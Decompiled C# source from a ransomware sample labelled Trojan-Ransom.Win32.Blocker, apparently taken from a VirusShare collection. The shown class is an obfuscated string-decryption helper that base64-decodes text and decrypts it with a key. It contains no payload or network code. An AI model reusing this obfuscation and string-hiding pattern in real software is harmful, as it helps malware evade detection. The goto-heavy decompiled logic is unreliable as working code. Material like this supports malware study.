// Decompiled with JetBrains decompiler
// Type: #f.#Ob
// Assembly: SynMood, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E74E0BE3-2156-4FD1-87D6-9C934F391488
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asay-91a905762db9f9c40fe89fad88d7cbf29ff032af.exe

using \u0023f;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0023f
{
  internal class \u0023Ob
  {
    public static string \u00235G([In] string obj0, [In] string obj1)
    {
      string str1;
      try
      {
        string str2 = Encoding.UTF8.GetString(\u0023Ob.\u00236G(Convert.FromBase64String(obj0), Encoding.UTF8.GetBytes(obj1)));
        if (true)
          str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        if (true)
          ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static byte[] \u00236G([In] byte[] obj0, [In] byte[] obj1)
    {
      byte[] numArray1;
      try
      {
        int num1 = (int) obj0[obj0.Length - 1];
        if (true)
          goto label_18;
label_1:
        int num2 = obj0.Length;
        short index1;
        byte[] numArray2;
        int num3;
        int num4;
        int num5;
        if (true)
        {
          byte[] numArray3 = new byte[num2 - 2 + 1];
          if (true)
            goto label_19;
label_3:
          if (true)
            goto label_20;
label_4:
          int length = obj0.Length;
          num5 = 2;
          num4 = length;
          num3 = 0;
          goto label_5;
label_20:
          index1 = (short) 0;
          goto label_4;
label_19:
          numArray2 = numArray3;
          goto label_3;
        }
        else
          goto label_12;
label_5:
        int num6 = num4 - num5;
        if (true)
          goto label_21;
label_6:
        int index2;
        if (true)
        {
          index2 = num3;
          goto label_15;
        }
        else
          goto label_15;
label_21:
        int num7 = num6;
        goto label_6;
label_12:
        index1 = (short) num2;
label_13:
        int num8 = index2 + 1;
        if (true)
          index2 = num8;
        else
          goto label_16;
label_15:
        num8 = index2;
label_16:
        int num9 = num7;
        int num10;
        if (num8 <= num9)
        {
          if ((int) index1 >= obj1.Length)
          {
            if (true)
              index1 = (short) 0;
          }
          num3 = index2;
          num4 = obj0.Length;
          num5 = 1;
          if (num5 != 0)
          {
            int num11 = num4 - num5;
            if (num3 < num11)
            {
              numArray2[index2] = Convert.ToByte((int) obj0[index2] - numArray2.Length % obj1.Length - (int) obj1[(int) index1] + num10);
              num2 = (int) (short) ((int) index1 + 1);
              goto label_12;
            }
            else
              goto label_13;
          }
          else
            goto label_5;
        }
        else
        {
          numArray1 = numArray2;
          if (false)
            goto label_13;
          else
            goto label_25;
        }
label_18:
        num10 = num1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray1 = (byte[]) null;
        ProjectData.ClearProjectError();
      }
label_25:
      return numArray1;
    }
  }
}
